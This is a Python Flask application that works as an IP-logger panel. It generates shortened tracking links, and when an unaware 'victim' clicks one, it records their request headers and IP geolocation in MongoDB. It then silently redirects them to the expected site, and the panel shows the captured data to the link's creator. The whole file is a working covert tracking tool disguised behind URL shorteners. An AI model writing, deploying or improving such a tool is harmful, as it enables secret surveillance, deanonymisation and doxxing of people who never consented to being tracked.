from flask import Flask, request, redirect, render_template
import random,string
import pyshorteners
import requests
from .config import *
from .db.database import mongo

panel = Flask(__name__,template_folder='templates/')

# Create DB and collection
db = mongo.iplog
log = db.logs

# Views
@panel.route('/')
def redirect_panel():
    return redirect('/panel')

@panel.route("/panel",methods=['GET','POST'])
def panel_index():
    # Arguments
    url = request.args.get("url")
    key = request.args.get("key")
    fake_redirect = request.args.get("redirect")

    # Put a link
    if request.method == "POST":
        global url_redirect
        url_redirect = request.form['url']
        # Validate the url
        if len(url_redirect) <= 8:
            return redirect('/panel')

        return redirect(f'/panel?url={url_redirect}')

    # If the link exist, generate the code
    elif url:
        # Key panel
        key = ''.join(random.choice(string.ascii_letters) for i in range(14))
        final_url = pyshorteners.Shortener().tinyurl.short(f'{request.base_url}?redirect={url_redirect}&key={key}')
        context = {"final_url":final_url,"key":key,"status":"url","url":url}

        return render_template('index.html',context=context,**context)


    # Victim link, use code and link
    elif fake_redirect and key:
        header = dict(request.headers)
        resp_api = requests.get(f"http://api.ipapi.com/api/{request.remote_addr}?access_key={ipapi_token}").json()

        db_save = {"key":key}
        db_save |= header | resp_api
        log.insert_one(db_save)

        return redirect(f"https://{url_redirect}",code=302)

    # If not exist any argument return the link
    return render_template('index.html')

@panel.route('/panel/admin')
def panel_admin():
    # Key panel argument
    key = request.args.get("key")
    # Get victim data
    panel_information = mongo.iplog.logs
    data = panel_information.find_one({"key":key})

    return render_template('panel.html',data=data)